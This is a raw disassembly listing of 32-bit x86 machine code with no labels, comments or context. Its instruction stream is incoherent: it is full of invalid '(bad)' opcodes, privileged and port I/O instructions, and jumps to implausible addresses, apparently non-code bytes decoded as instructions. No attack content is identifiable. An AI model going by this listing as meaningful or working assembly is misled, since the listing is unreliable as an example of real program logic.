  40bb5e:	push   ecx
  40bb5f:	ret    0x166
  40bb62:	push   ebp
  40bb63:	pop    esi
  40bb64:	leavew 
  40bb66:	inc    ebp
  40bb67:	sbb    BYTE PTR [ebp-0x76132cab],cl
  40bb6d:	in     al,dx
  40bb6e:	xchg   esp,eax
  40bb6f:	push   esi
  40bb70:	shl    al,0x66
  40bb73:	add    DWORD PTR [ebp+0x1],0x38e1008d
  40bb7a:	mov    DWORD PTR [edi],ecx
  40bb7c:	cwde   
  40bb7d:	or     cl,BYTE PTR [ecx-0x767a6600]
  40bb83:	setl   BYTE PTR [edx]
  40bb86:	inc    ebp
  40bb87:	add    BYTE PTR [edi],cl
  40bb89:	test   DWORD PTR [ebp+0xf],ecx
  40bb8c:	xor    edi,edx
  40bb8e:	add    eax,DWORD PTR [eax]
  40bb90:	xor    ecx,DWORD PTR [ebx+0x458866]
  40bb96:	mov    eax,DWORD PTR [ebp-0x1848f010]
  40bb9c:	test   al,0x0
  40bb9e:	mov    BYTE PTR [ebx+0xc18cc3],0x89
  40bba5:	adc    BYTE PTR [eax-0x76ff3f7c],ch
  40bbab:	add    BYTE PTR [eax-0x57f076aa],ch
  40bbb1:	rol    DWORD PTR [ebp+0x0],1
  40bbb4:	mov    ecx,DWORD PTR [ebx+0x758cf0]
  40bbba:	inc    DWORD PTR [ebx-0x748a0fe8]
  40bbc0:	jmp    FWORD PTR [ebx]
  40bbc2:	adc    BYTE PTR [ebx],al
  40bbc4:	jne    0x40bbd5
  40bbc6:	call   DWORD PTR [eax-0x14]
  40bbc9:	mov    DWORD PTR [edi-0x1c],edi
  40bbcc:	push   DWORD PTR [edi-0x35e3f1ff]
  40bbd2:	inc    ebp
  40bbd3:	test   BYTE PTR [ebx-0x47ffe400],cl
  40bbd9:	dec    eax
  40bbda:	add    DWORD PTR [ebx+0x0],edx
  40bbdd:	dec    ebp
  40bbde:	inc    ebp
  40bbdf:	mov    esi,0x7f8cff8b
  40bbe4:	add    BYTE PTR [ebp-0x74728b75],al
  40bbea:	add    al,0x83
  40bbec:	adc    esp,esi
  40bbee:	(bad)  
  40bbef:	and    edx,DWORD PTR ds:0x780f0703
  40bbf5:	jp     0x40bb82
  40bbf7:	sysret 
  40bbf9:	pop    edx
  40bbfa:	add    eax,DWORD PTR [ebx]
  40bbfc:	cmp    esi,DWORD PTR [ebx+esi*2-0x73]
  40bc00:	sub    edx,DWORD PTR [ebx+eax*1]
  40bc03:	dec    ebp
  40bc04:	mov    DWORD PTR [ebp-0x74a48ba1],eax
  40bc0a:	ret    0x83
  40bc0d:	clc    
  40bc0e:	mov    esp,DWORD PTR [ebx]
  40bc10:	add    DWORD PTR [ebx],0x1c
  40bc13:	jnp    0x90504792
  40bc19:	pop    ecx
  40bc1a:	add    BYTE PTR [ebx],al
  40bc1c:	xor    DWORD PTR [eax+eax*1-0x73],0xffffff84
  40bc21:	adc    al,0x1
  40bc23:	jge    0x40bc25
  40bc25:	mov    edx,edx
  40bc27:	cld    
  40bc28:	test   BYTE PTR [edi],bh
  40bc2a:	add    edi,edi
  40bc2c:	add    BYTE PTR [esi],al
  40bc2e:	neg    BYTE PTR [ebp-0x7c]
  40bc31:	add    DWORD PTR [eax],eax
  40bc33:	pop    es
  40bc34:	add    BYTE PTR [edi-0x48fff17a],dh
  40bc3a:	add    BYTE PTR [eax+eax*8],cl
  40bc3d:	inc    ebp
  40bc3e:	test   BYTE PTR [ebx+0x300fc00],al
  40bc44:	mov    esi,0xf80039
  40bc49:	fisttp DWORD PTR [edi]
  40bc4b:	mov    bh,0xda
  40bc4d:	push   cs
  40bc4e:	add    BYTE PTR [edi+0x4d340c39],dh
  40bc54:	test   bh,bh
  40bc56:	add    ah,dh
  40bc58:	add    cl,al
  40bc5a:	mov    cl,0x3
  40bc5c:	add    DWORD PTR [ecx+0x7d65ec00],ecx
  40bc62:	add    BYTE PTR [edx-0x36],dh
  40bc65:	mov    ecx,DWORD PTR [esi]
  40bc67:	call   0xef8742e
  40bc6c:	or     al,0xb7
  40bc6e:	dec    ebp
  40bc6f:	or     al,0xf
  40bc71:	inc    ebp
  40bc72:	dec    eax
  40bc73:	add    DWORD PTR [ebx],0x8
  40bc76:	(bad)  
  40bc78:	scas   al,BYTE PTR es:[edi]
  40bc79:	dec    ebp
  40bc7a:	add    BYTE PTR [ecx],bh
  40bc7c:	(bad)  
  40bc7d:	lock adc al,0x82
  40bc80:	mov    edi,edi
  40bc82:	call   0xff9cbc86
  40bc87:	rcl    BYTE PTR [edi-0x15],0x31
  40bc8b:	xor    edi,DWORD PTR [edi+0x5e]
  40bc8e:	adc    ebx,eax
  40bc90:	mov    eax,DWORD PTR gs:[eax]
  40bc93:	mov    edx,esi
  40bc95:	nop
  40bc96:	rol    BYTE PTR [eax],1
  40bc98:	mov    bh,0x83
  40bc9a:	push   cs
  40bc9b:	or     al,0xb7
  40bc9d:	xor    ecx,DWORD PTR [esi+edx*2]
  40bca0:	sti    
  40bca1:	cmp    DWORD PTR [ecx+0xf],ebp
  40bca4:	dec    edx
  40bca5:	test   DWORD PTR [ecx+0x318bec00],ecx
  40bcab:	or     al,0x41
  40bcad:	ret    
  40bcae:	or     DWORD PTR [esi+0x65],edi
  40bcb1:	pop    eax
  40bcb2:	add    BYTE PTR [ebp-0x32],dh
  40bcb5:	xor    ecx,eax
  40bcb7:	inc    eax
  40bcb8:	mov    bh,0x76
  40bcba:	push   cs
  40bcbb:	inc    eax
  40bcbc:	mov    bh,0x3
  40bcbe:	or     al,0x8
  40bcc0:	sti    
  40bcc1:	dec    eax
  40bcc2:	sub    ecx,DWORD PTR [ebx+0x70892479]
  40bcc8:	cld    
  40bcc9:	mov    edi,DWORD PTR [ebp+0x18]
  40bccc:	mov    ecx,DWORD PTR [ebp-0x7b]
  40bccf:	add    esi,DWORD PTR [eax+ecx*1-0x75]
  40bcd3:	jne    0x40bcb9
  40bcd5:	cmp    ebx,DWORD PTR [edi+esi*2]
  40bcd8:	jns    0xff50b957
  40bcde:	pop    ecx
  40bcdf:	jge    0x40bce0
  40bce1:	cmp    eax,edi
  40bce3:	cld    
  40bce4:	inc    ebp
  40bce5:	iret   
  40bce6:	or     BYTE PTR [eax-0x5],bh
  40bce9:	jae    0x40bd68
  40bceb:	(bad)  
  40bced:	xor    al,0xf
  40bcef:	jmp    0x40bd6b
  40bcf1:	mov    ecx,DWORD PTR [edi]
  40bcf3:	lea    ebx,[edx-0x4f]
  40bcf6:	mov    esi,DWORD PTR [ebx]
  40bcf8:	in     al,dx
  40bcf9:	test   BYTE PTR [ebp+0x27],0x83
  40bcfd:	jge    0x40bd07
  40bcff:	add    edi,ebx
  40bd01:	mov    DWORD PTR [ebp-0x8],ecx
  40bd04:	cmp    eax,edi
  40bd06:	hlt    
  40bd07:	adc    ah,BYTE PTR [eax+0xf8b4d7d]
  40bd0d:	jl     0x40bd5f
  40bd0f:	clc    
  40bd10:	(bad)  
  40bd12:	js     0x40bc9f
  40bd14:	push   DWORD PTR [edx-0x10]
  40bd17:	mov    eax,ecx
  40bd19:	clc    
  40bd1a:	add    edi,edi
  40bd1c:	mov    DWORD PTR [eax],edx
  40bd1e:	call   0xfbe125e
  40bd23:	inc    edi
  40bd24:	popa   
  40bd25:	jge    0x40bd26
  40bd27:	cmp    ebx,DWORD PTR [edi-0x4]
  40bd2a:	xor    edi,DWORD PTR [edx-0x3ffd78c0]
  40bd30:	rcr    BYTE PTR [esi-0x37],0xc9
  40bd34:	push   ebp
  40bd35:	or     ah,ch
  40bd37:	push   ebp
  40bd38:	sub    ah,0x1
  40bd3b:	in     al,dx
  40bd3c:	add    BYTE PTR [edx-0x7ac7a14],bh
  40bd42:	fist   DWORD PTR [ebp+0x57]
  40bd45:	(bad)  
  40bd46:	sbb    al,bh
  40bd48:	test   BYTE PTR [ebp+0x4500f800],al
  40bd4e:	inc    ebp
  40bd4f:	mov    edi,DWORD PTR [ebx]
  40bd51:	cld    
  40bd52:	je     0x40bda1
  40bd54:	cmp    DWORD PTR [ebx+0x4d05fc78],ecx
  40bd5a:	ror    BYTE PTR [ebx-0x74740315],0x78
  40bd61:	adc    BYTE PTR [ebp-0x42],al
  40bd64:	mov    ecx,DWORD PTR [eax]
  40bd66:	sbb    al,0x7
  40bd68:	push   eax
  40bd69:	inc    ebp
  40bd6a:	mov    ecx,DWORD PTR [edi-0x7487adec]
  40bd70:	add    edi,esp
  40bd72:	or     BYTE PTR [ebx+0x890155],bl
  40bd78:	cld    
  40bd79:	mov    edi,0x372f7
  40bd7e:	jge    0x40bd4e
  40bd80:	xor    eax,esi
  40bd82:	mov    edi,eax
  40bd84:	hlt    
  40bd85:	iret   
  40bd86:	pop    ebp
  40bd87:	inc    ebp
  40bd88:	jbe    0x40bdc5
  40bd8a:	cmp    ecx,DWORD PTR [edi]
  40bd8c:	adc    al,0x7b
  40bd8e:	push   es
  40bd8f:	add    BYTE PTR [edi+0x2fc7a8b],dh
  40bd95:	dec    ebp
  40bd96:	div    DWORD PTR [ebx]
  40bd98:	sbb    al,0x3
  40bd9a:	mov    edi,DWORD PTR [ebx]
  40bd9c:	test   DWORD PTR [edi],ecx
  40bd9e:	je     0x40be09
  40bda0:	mov    eax,DWORD PTR [eax]
  40bda2:	or     BYTE PTR [ebx-0x76820302],cl
  40bda8:	cmp    eax,DWORD PTR [eax]
  40bdaa:	jbe    0x40bdac
  40bdac:	mov    ebx,esi
  40bdae:	or     al,0xdf
  40bdb0:	jg     0x40bd7d
  40bdb2:	add    eax,DWORD PTR [ecx+edi*1-0x1ff07fe]
  40bdb9:	dec    ebp
  40bdba:	add    ecx,DWORD PTR [ecx-0x257a2b83]
  40bdc0:	je     0x40bda0
  40bdc2:	mov    edi,ebx
  40bdc4:	mov    ebx,DWORD PTR [ebp-0xc]
  40bdc7:	mov    ecx,DWORD PTR [ecx+0x7ddaf4f0]
  40bdcd:	adc    dh,BYTE PTR [edx+0x55]
  40bdd0:	jmp    0x40bd5d
  40bdd2:	xor    edi,esp
  40bdd4:	pop    edi
  40bdd5:	rcr    BYTE PTR [ebx+0x33],cl
  40bdd8:	ret    0x3
  40bddb:	cmp    DWORD PTR [ebx+0x2c17830a],ecx
  40bde1:	push   ebp
  40bde2:	xor    eax,0x89fc9c8b
  40bde7:	sar    ah,cl
  40bde9:	xor    eax,DWORD PTR [ebp+0x3]
  40bdec:	xor    al,0x39
  40bdee:	pushf  
  40bdef:	or     cl,BYTE PTR [ebx+0x4d02fc0f]
  40bdf5:	add    BYTE PTR [ebx+0x4dfcfc8b],cl
  40bdfb:	pop    ebp
  40bdfc:	mov    ecx,DWORD PTR [ebx-0x3fb20f04]
  40be02:	push   ebx
  40be03:	add    ebx,DWORD PTR [ebp-0x75]
  40be06:	push   esi
  40be07:	adc    BYTE PTR [edi+0x4d],dl
  40be0a:	push   ecx
  40be0b:	xor    eax,edi
  40be0d:	mov    eax,esi
  40be0f:	in     al,0xeb
  40be11:	dec    ebp
  40be12:	add    ecx,DWORD PTR [ebx-0x317403b3]
  40be18:	nop
  40be19:	iret   
  40be1a:	add    dh,dl
  40be1c:	push   edi
  40be1d:	dec    ebp
  40be1e:	sahf   
  40be1f:	mov    esi,DWORD PTR [edx]
  40be21:	add    esi,DWORD PTR [ebx]
  40be23:	add    esi,DWORD PTR [ebx]
  40be25:	cmp    eax,DWORD PTR [ebx]
  40be27:	je     0x40be2c
  40be29:	add    ecx,DWORD PTR [ecx+0xb4de808]
  40be2f:	mov    eax,DWORD PTR [esp+edi*8+0x4800ce02]
  40be36:	pop    ebp
  40be37:	mov    ecx,DWORD PTR [ebx-0x217bf3f8]
  40be3d:	sahf   
  40be3e:	fbstp  TBYTE PTR [edx]
  40be40:	(bad)  [ecx+0x45020c84]
  40be46:	add    BYTE PTR [eax],dh
  40be48:	pop    ebp
  40be49:	pushf  
  40be4a:	mov    ecx,DWORD PTR [ebx+0x75001080]
  40be50:	xor    ecx,DWORD PTR [ebx+0x3bd803]
  40be56:	ud0    ecx,DWORD PTR [edi-0x75]
  40be5a:	add    ah,bh
  40be5c:	add    ecx,esi
  40be5e:	or     bh,cl
  40be60:	dec    ebp
  40be61:	inc    ebp
  40be62:	mov    edi,DWORD PTR [ebx]
  40be64:	xor    esi,DWORD PTR [ebp+0x3]
  40be67:	mov    ecx,DWORD PTR [ecx+0x5d75f010]
  40be6d:	mov    edi,DWORD PTR [ebx]
  40be6f:	fdiv   DWORD PTR [eax+eax*1-0x75]
  40be73:	push   eax
  40be75:	or     al,0x5d
  40be77:	inc    ebp
  40be78:	imul   eax,edi,0x14
  40be7b:	loopne 0x40be5b
  40be7d:	sbb    ebx,edi
  40be7f:	jg     0x40be9d
  40be81:	inc    ebp
  40be82:	jne    0x40bea0
  40be84:	mov    ebx,DWORD PTR [eax+esi*8+0x6bfc5d8b]
  40be8b:	(bad)  
  40be8c:	adc    al,0xc7
  40be8e:	fiadd  WORD PTR [ebp-0x21]
  40be91:	jne    0x40beef
  40be93:	mov    edx,DWORD PTR [eax]
  40be95:	clc    
  40be96:	test   BYTE PTR [ebp+0x2],cl
  40be99:	xor    eax,DWORD PTR [eax]
  40be9b:	xor    eax,DWORD PTR [ebp-0x73]
  40be9e:	mov    eax,DWORD PTR [ebx]
  40bea0:	cld    
  40bea1:	jb     0x40bee8
  40bea3:	add    BYTE PTR [ebx+0x45],ch
  40bea6:	adc    al,0x8b
  40bea8:	rcr    eax,0x48
  40beab:	add    BYTE PTR [ebx],al
  40bead:	add    ecx,DWORD PTR [eax]
  40beaf:	pmaxub mm1,mm3
  40beb2:	dec    ebp
  40beb3:	dec    DWORD PTR [ebx+0x5545fc24]
  40beb9:	xor    esi,DWORD PTR [ebx]
  40bebb:	add    eax,DWORD PTR [ebx]
  40bebd:	cmp    esi,DWORD PTR [ebx]
  40bebf:	hlt    
  40bec0:	mov    DWORD PTR [edi],ecx
  40bec2:	fadd   QWORD PTR [ebp+0x8]
  40bec5:	xor    edx,edi
  40bec7:	add    ebx,edi
  40bec9:	cmp    ecx,edx
  40becb:	clts   
  40becd:	jp     0x40bf1c
  40becf:	dec    DWORD PTR [ecx+0x4dfcdc8b]
  40bed5:	(bad)  
  40bed6:	xor    eax,edi
  40bed8:	add    eax,DWORD PTR [ebp+0xc]
  40bedb:	jne    0x40bf22
  40bedd:	mov    ecx,DWORD PTR [ebp+0x724d01f8]
  40bee3:	xor    eax,DWORD PTR [eax]
  40bee5:	lea    eax,[ebp+0x1]
  40bee8:	(bad)  
  40bee9:	jb     0x40bec3
  40beeb:	add    BYTE PTR [ebp+0x45e9f845],al
  40bef1:	add    bh,bh
  40bef3:	add    BYTE PTR [eax*2+0x12018d80],cl
  40befa:	add    bh,al
  40befc:	adc    BYTE PTR [ecx*2+0x30e332d],cl
  40bf03:	pop    ebp
  40bf04:	mov    DWORD PTR [ebx],esi
  40bf06:	hlt    
  40bf07:	add    ecx,eax
  40bf09:	jmp    0x85bf20
  40bf0e:	inc    DWORD PTR [ebp+0xc]
  40bf11:	xor    eax,DWORD PTR [eax+0x890103]
  40bf17:	in     al,dx
  40bf18:	push   eax
  40bf19:	inc    ebp
  40bf1a:	mov    DWORD PTR [ebx],esi
  40bf1c:	hlt    
  40bf1d:	add    eax,DWORD PTR [ebp-0x77]
  40bf20:	mov    WORD PTR [esi+eiz*2],cs
  40bf23:	dec    ebp
  40bf24:	(bad)  
  40bf25:	mov    esp,eax
  40bf27:	fcomp  QWORD PTR [ecx+0x45cff8ce]
  40bf2d:	enter  0x633,0x3
  40bf31:	add    al,0x3b
  40bf33:	mov    esp,esi
  40bf35:	in     al,dx
  40bf36:	and    eax,DWORD PTR [ebp+0x45]
  40bf39:	mov    ecx,DWORD PTR [ebx-0x39ba1f68]
  40bf3f:	mov    ecx,esi
  40bf41:	cld    
  40bf42:	pushf  
  40bf43:	dec    ebp
  40bf44:	sahf   
  40bf45:	xor    esi,DWORD PTR [edx]
  40bf47:	add    ecx,DWORD PTR [ebx-0x7f8befc5]
  40bf4d:	mov    eax,DWORD PTR [ecx]
  40bf4f:	cld    
  40bf50:	add    BYTE PTR [ebp-0x31],cl
  40bf53:	xor    ebp,DWORD PTR [edi+0x50c15103]
  40bf59:	pop    ds
  40bf5a:	mov    eax,ecx
  40bf5c:	cld    
  40bf5d:	sbb    dh,al
  40bf5f:	dec    ebp
  40bf60:	(bad)  
  40bf61:	mov    eax,DWORD PTR [ebp+0x10]
  40bf64:	jne    0x40bee6
  40bf66:	mov    eax,DWORD PTR [ecx]
  40bf68:	fadd   DWORD PTR [eax]
  40bf6a:	(bad)  
  40bf6b:	mov    bh,0xc7
  40bf6d:	push   ecx
  40bf6e:	fdiv   DWORD PTR [ebp-0x7a]
  40bf71:	(bad)  
  40bf72:	dec    DWORD PTR [eax]
  40bf74:	call   FWORD PTR [ecx]
  40bf76:	inc    ebp
  40bf77:	inc    ebp
  40bf78:	xor    eax,DWORD PTR [ebx]
  40bf7a:	add    ecx,DWORD PTR [eax]
  40bf7c:	cmp    ecx,DWORD PTR [ebp-0xc]
  40bf7f:	mov    edx,DWORD PTR [edi]
  40bf81:	fadd   DWORD PTR [ebp+0x0]
  40bf84:	mov    eax,DWORD PTR [ebx-0x39fd18]
  40bf8a:	test   ah,dh
  40bf8c:	sahf   
  40bf8d:	push   ecx
  40bf8e:	xor    cl,BYTE PTR [ecx+0x45e80c89]
  40bf94:	out    dx,eax
  40bf95:	mov    eax,DWORD PTR [eax]
  40bf97:	or     al,0xc7
  40bf99:	(bad)  
  40bf9a:	in     al,dx
  40bf9b:	(bad)  
  40bf9c:	sbb    eax,ecx
  40bf9e:	add    DWORD PTR [ebp+0x45],eax
  40bfa1:	jne    0x40bf32
  40bfa3:	mov    eax,DWORD PTR [eax+ebp*8]
  40bfa6:	mov    eax,esi
  40bfa8:	cld    
  40bfa9:	test   dh,bl
  40bfab:	sahf   
  40bfac:	fbstp  TBYTE PTR [edx]
  40bfae:	ret    0x89
  40bfb1:	call   0x4e3cd041
  40bfb6:	(bad)  
  40bfb7:	xor    eax,edi
  40bfb9:	add    eax,DWORD PTR [ebp+0xf]
  40bfbc:	mov    eax,ecx
  40bfbe:	cld    
  40bfbf:	dec    ebp
  40bfc0:	(bad)  
  40bfc1:	mov    edi,eax
  40bfc3:	cdq    
  40bfc4:	inc    ebp
  40bfc5:	inc    ebp
  40bfc6:	mov    esi,DWORD PTR [ebx]
  40bfc8:	cld    
  40bfc9:	lea    eax,[ebp+0x3]
  40bfcc:	xor    esi,DWORD PTR [edx+0x3]
  40bfcf:	add    BYTE PTR [ebx],bh
  40bfd1:	inc    ebp
  40bfd2:	je     0x40bf5f
  40bfd4:	mov    esp,esp
  40bfd6:	cwde   
  40bfd7:	mov    BYTE PTR [ebp-0x39],0x8b
  40bfdb:	add    al,0xe4
  40bfdd:	(bad)  
  40bfdf:	sub    ecx,DWORD PTR [ecx+0x458b0cff]
  40bfe5:	lock mov eax,DWORD PTR [ebp-0x14]
  40bfe9:	mov    eax,esi
  40bfeb:	aam    0xc7
  40bfed:	jmp    0xd645:0x2972c1
  40bff4:	mov    eax,ebp
  40bff6:	in     al,dx
  40bff7:	inc    esi
  40bff9:	mov    eax,edi
  40bffb:	cld    
  40bffc:	jmp    0x750ffbcf
  40c001:	ror    DWORD PTR [ebx+0x4575ec45],0x8b
  40c008:	mov    edi,eax
  40c00a:	fadd   DWORD PTR [ebx]
  40c00c:	add    BYTE PTR [ebp+0xf],al
  40c00f:	xor    ecx,ecx
  40c011:	add    edi,edi
  40c013:	pop    edi
  40c014:	hlt    
  40c015:	pop    ebx
  40c016:	push   eax
  40c017:	ret    0xeb
  40c01a:	mov    ecx,DWORD PTR [ebx+0x2845830c]
  40c020:	mov    eax,DWORD PTR [ebp+0x10]
  40c023:	xor    eax,0xc7019c89
  40c028:	add    al,bl
  40c02a:	rol    BYTE PTR [ebp+0x4575f850],0xff
  40c031:	mov    DWORD PTR [eax],ecx
  40c033:	or     al,0x45
  40c035:	inc    ebp
  40c036:	mov    edi,DWORD PTR [ecx+0x74d08fc]
  40c03c:	xor    eax,ecx
  40c03e:	add    ebx,DWORD PTR [esi+0x568b323b]
  40c044:	clc    
  40c045:	jne    0x40c058
  40c047:	add    ecx,DWORD PTR [ebp+0x3b]
  40c04a:	xor    ecx,DWORD PTR [edi]
  40c04c:	lea    esp,[ecx]
  40c04e:	add    DWORD PTR [eax],eax
  40c050:	jb     0x40bfdd
  40c052:	add    BYTE PTR [eax],cl
  40c054:	inc    ebp
  40c055:	jne    0x40c042
  40c057:	add    ecx,DWORD PTR [ebx-0x3976f3c4]
  40c05d:	or     al,0xc7
  40c05f:	inc    ebp
  40c060:	scas   eax,DWORD PTR es:[edi]
  40c061:	xor    BYTE PTR [ebx+0x48be49c],cl
  40c067:	in     al,0x8b
  40c069:	jne    0x40c063
  40c06b:	mov    eax,esi
  40c06d:	or     al,0x9c
  40c06f:	icebp  
  40c070:	sahf   
  40c071:	shl    DWORD PTR [edx],0xf2
  40c074:	mov    esi,DWORD PTR [esp+edi*8+0x33934d68]
  40c07b:	lsl    ebp,bx
  40c07e:	cmp    DWORD PTR [eax],eax
  40c080:	cdq    
  40c081:	mov    eax,DWORD PTR [ebp-0xba00f4]
  40c087:	add    edx,DWORD PTR [ebp-0x60]
  40c08a:	mov    eax,DWORD PTR [eax]
  40c08c:	call   0x81490e1c
  40c091:	jge    0x40c030
  40c093:	sub    esi,DWORD PTR [edx]
  40c095:	xor    al,0x33
  40c097:	jge    0x40c082
  40c099:	xor    edi,ebp
  40c09b:	add    edi,edi
  40c09d:	mov    DWORD PTR [ebp-0x24],ecx
  40c0a0:	xor    esi,edi
  40c0a2:	add    eax,DWORD PTR [ebx+edi*1-0x3ff7500]
  40c0a9:	jne    0x40c0b3
  40c0ab:	xor    eax,DWORD PTR [ebp+0x3]
  40c0ae:	jmp    0x40c039
  40c0b0:	mov    edi,eax
  40c0b2:	cld    
  40c0b3:	mov    esi,0x5e85c7f0
  40c0b9:	clc    
  40c0ba:	leave  
  40c0bb:	xchg   edi,eax
  40c0bc:	or     al,0x0
  40c0be:	push   ebp
  40c0bf:	mov    ebp,esp
  40c0c1:	cld    
  40c0c2:	in     al,dx
  40c0c3:	icebp  
  40c0c4:	(bad)  
  40c0c5:	jnp    0x40c0c3
  40c0c7:	add    eax,DWORD PTR [ebp+0x453bf8d1]
  40c0cd:	jae    0x40c103
  40c0cf:	sub    ebx,DWORD PTR [ebp+ecx*4-0x76f38f75]
  40c0d6:	inc    ebp
  40c0d7:	call   0x823d7867
  40c0dc:	push   edi
  40c0dd:	call   DWORD PTR [ecx+0x0]
  40c0e0:	xor    ecx,DWORD PTR [ecx+0x7d72ecba]
  40c0e6:	add    BYTE PTR [ebx+0x3082b8b],cl
  40c0ec:	ret    0xf00f
  40c0ef:	xor    eax,DWORD PTR [esi+ebp*8-0x76ffccff]
  40c0f6:	inc    ebp
  40c0f7:	loopne 0x40c084
  40c0f9:	jne    0x40c103
  40c0fb:	mov    esi,DWORD PTR [eax-0x20]
  40c0fe:	push   edi
  40c0ff:	jge    0x40c176
  40c101:	xor    eax,edi
  40c103:	(bad)  
  40c104:	in     al,0x3e
  40c106:	test   DWORD PTR [edx-0x8],esi
  40c109:	add    BYTE PTR [ebp+0x75],al
  40c10c:	mov    ecx,DWORD PTR [ebx+0x7d7df0fc]
  40c112:	xor    esi,DWORD PTR [ebx]
  40c114:	xor    eax,DWORD PTR [ebx]
  40c116:	add    edi,DWORD PTR [ebx]
  40c118:	cmp    DWORD PTR [ebp-0x39],esi
  40c11b:	mov    edx,DWORD PTR [ebp-0x7b82fe10]
  40c121:	xor    eax,DWORD PTR [eax]
  40c123:	add    eax,DWORD PTR [eax]
  40c125:	cmp    esi,DWORD PTR [ebp+0x75]
  40c128:	mov    ecx,DWORD PTR [ebx+0x7d86e008]
  40c12e:	add    BYTE PTR [ecx],al
  40c130:	add    BYTE PTR [ebx+0x4d8b0275],al
  40c136:	or     al,0x75
  40c138:	ja     0x40c0c5
  40c13a:	mov    esi,esp
  40c13c:	cld    
  40c13d:	pop    ebp
  40c13e:	stc    
  40c13f:	mov    edi,edx
  40c141:	in     al,0x75
  40c143:	jge    0x40c180
  40c145:	mov    ecx,DWORD PTR [edi]
  40c147:	or     al,0xc4
  40c149:	icebp  
  40c14a:	add    BYTE PTR [ebx+ecx*4-0xe6c0394],bh
  40c151:	jae    0x40c145
  40c153:	add    esi,DWORD PTR [ebp-0xc]
  40c156:	push   ebx
  40c157:	jne    0x40c19e
  40c159:	mov    esi,DWORD PTR [edx]
  40c15b:	add    al,0x9c
  40c15d:	icebp  
  40c15e:	jmp    0x9dc255
  40c163:	cmp    esi,DWORD PTR [ebp+0xf]
  40c166:	xor    edx,DWORD PTR [ebp+ecx*4-0x1]
  40c16a:	clc    
  40c16b:	pop    ebx
  40c16c:	repnz inc ebp
  40c16e:	out    dx,eax
  40c16f:	pop    edi
  40c170:	test   DWORD PTR [ebx],0x33fe456d
  40c176:	pop    esp
  40c177:	add    ecx,DWORD PTR [eax]
  40c179:	pop    esi
  40c17a:	jge    0x40c13e
  40c17c:	(bad)  
  40c17e:	xor    ecx,DWORD PTR [ebx+0x540f83e6]
  40c184:	add    BYTE PTR [ebp+0x75],al
  40c187:	xor    eax,0xc7ec9c8b
  40c18c:	xor    ah,bl
  40c18e:	repnz test esi,edi
  40c191:	clc    
  40c192:	mov    bh,0x45
  40c194:	rcl    DWORD PTR [ebx+0xc],0xbe
  40c198:	stc    
  40c199:	or     BYTE PTR [ebp+0x7],bh
  40c19c:	mov    esi,eax
  40c19e:	in     al,dx
  40c19f:	sahf   
  40c1a0:	jne    0x40c1d4
  40c1a2:	mov    eax,DWORD PTR [ebx]
  40c1a4:	or     BYTE PTR [ecx+0x45b4e8f1],cl
  40c1aa:	sahf   
  40c1ab:	xor    esi,DWORD PTR [edx]
  40c1ad:	add    ecx,DWORD PTR [ecx+0x75e0e089]
  40c1b3:	mov    ecx,DWORD PTR [ebx-0xeba13e0]
  40c1b9:	mov    esi,edx
  40c1bb:	lock inc cl
  40c1be:	push   ss
  40c1bf:	inc    ebp
  40c1c0:	jne    0x40c143
  40c1c2:	mov    esi,eax
  40c1c4:	in     al,dx
  40c1c5:	mov    ch,0xf1
  40c1c7:	clc    
  40c1c8:	repnz inc ebp
  40c1ca:	dec    BYTE PTR [ebx-0x3e8a07f8]
  40c1d0:	mov    eax,DWORD PTR [ebp-0x24]
  40c1d3:	cmp    DWORD PTR [esi],0xff85c3f8
  40c1d9:	clc    
  40c1da:	call   0x5dcc6124
  40c1df:	hlt    
  40c1e0:	add    ecx,eax
  40c1e2:	clc    
  40c1e3:	inc    ebp
  40c1e4:	jne    0x40c167
  40c1e6:	mov    esi,esp
  40c1e8:	clc    
  40c1e9:	test   DWORD PTR [ebp-0x8],ebx
  40c1ec:	xor    eax,DWORD PTR [ebp+0x3b]
  40c1ef:	mov    esi,ebx
  40c1f1:	in     al,dx
  40c1f2:	xchg   ebp,eax
  40c1f3:	rol    DWORD PTR [ecx],0x45
  40c1f6:	sbb    BYTE PTR [ecx+0x58bec45],al
  40c1fc:	cld    
  40c1fd:	clc    
  40c1fe:	pop    eax
  40c1ff:	pop    es
  40c200:	xor    eax,DWORD PTR [eax]
  40c202:	add    esp,DWORD PTR [esi-0x77]
  40c205:	inc    ebp
  40c206:	hlt    
  40c207:	mov    ebx,esi
  40c209:	or     BYTE PTR [ebp-0x7b0040],al
  40c20f:	add    ecx,DWORD PTR [ebx-0x14ba2800]
  40c215:	test   DWORD PTR [ebx-0x3e2b03f1],ecx
  40c21b:	add    dl,al
  40c21d:	mov    ecx,ecx
  40c21f:	sbb    BYTE PTR [eax],cl
  40c221:	rcl    BYTE PTR [ebp-0x7c],0xec
  40c225:	add    ebp,esp
  40c227:	add    bh,al
  40c229:	mov    edi,esp
  40c22b:	and    BYTE PTR [ebp+0x4500f842],al
  40c231:	data16 xor al,0xc1
  40c234:	pushf  
  40c235:	or     BYTE PTR [ebx+0x5666fc00],cl
  40c23b:	rcl    DWORD PTR [edi+0x4d],0x51
  40c23f:	xor    ax,WORD PTR [ecx]
  40c242:	mov    ebx,0x37285
  40c247:	add    bl,al
  40c249:	inc    ebp
  40c24a:	inc    ebp
  40c24b:	mov    ecx,DWORD PTR [ebx-0x39ba03f8]
  40c251:	add    eax,ebx
  40c253:	cmp    al,0x45
  40c255:	inc    ebp
  40c256:	push   edi
  40c257:	mov    edi,DWORD PTR [ebp+0x50]
  40c25a:	mov    eax,eax
  40c25c:	lock test BYTE PTR [ebp+0x3],cl
  40c260:	xor    eax,DWORD PTR [eax]
  40c262:	mov    DWORD PTR [ebp-0x10],eax
  40c265:	xor    eax,0x8b358c45
  40c26a:	pushf  
  40c26b:	aam    0x8b
  40c26d:	xabort 0xc3
  40c270:	dec    ebp
  40c271:	inc    ebp
  40c272:	xor    ecx,DWORD PTR [ebx-0x78070377]
  40c278:	inc    ebp
  40c279:	add    ebp,esi
  40c27b:	add    BYTE PTR [eax+ecx*1+0x3f4498b],bl
  40c282:	dec    ebp
  40c283:	mov    esi,DWORD PTR [ebx]
  40c285:	cld    
  40c286:	mov    DWORD PTR [edi+0x4501f4],eax
  40c28c:	xor    DWORD PTR [eax],edx
  40c28e:	pushf  
  40c28f:	dec    ebp
  40c290:	mov    ecx,DWORD PTR [ecx-0x2db2df14]
  40c296:	xor    esi,DWORD PTR [ebx]
  40c298:	mov    DWORD PTR [edi+0x4501ec],eax
  40c29e:	xor    eax,0xb8529f55
  40c2a3:	push   ebp
  40c2a4:	xchg   ebp,eax
  40c2a5:	xor    eax,DWORD PTR [eax]
  40c2a7:	add    ecx,DWORD PTR [ecx+0x45712052]
